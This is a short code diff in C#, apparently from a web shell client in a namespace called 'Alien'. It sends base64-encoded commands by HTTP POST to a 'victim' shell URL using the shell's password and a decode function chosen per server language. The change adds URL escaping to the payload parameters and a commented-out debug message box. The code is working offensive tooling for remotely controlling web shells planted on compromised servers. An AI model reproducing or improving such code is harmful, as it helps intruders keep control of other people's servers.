@@ -319,6 +319,8 @@ namespace Alien
                 resp = await m_clnt.PostAsync(m_victim.ShellURL, content);
                 szRespContent = await resp.Content.ReadAsStringAsync();
 
+                //MessageBox.Show(szRespContent);
+
                 if (!m_bUseCrypto)
                 {
                     szSplitter = $"[{szSplitter}]";
@@ -521,10 +523,10 @@ namespace Alien
             else
             {
                 for (int i = 0; i < asParams.Length; i++)
-                    asParams[i] = $"z{i}={clsEzData.fnszStre2b64(asParams[i])}";
+                    asParams[i] = $"z{i}={Uri.EscapeDataString(clsEzData.fnszStre2b64(asParams[i]))}";
 
                 string szParams = string.Join("&", asParams);
-                szPayload = $"{m_victim.ShellPassword}={m_dicDecodeFunc[m_victim.ShellLanguage].Replace("[PATTERN]", clsEzData.fnszStre2b64(szPayload))}&{szParams}";
+                szPayload = $"{m_victim.ShellPassword}={m_dicDecodeFunc[m_victim.ShellLanguage].Replace("[PATTERN]", Uri.EscapeDataString(clsEzData.fnszStre2b64(szPayload)))}&{szParams}";
             }
 
             return await fnHttpPOST(szPayload, szSplitter);
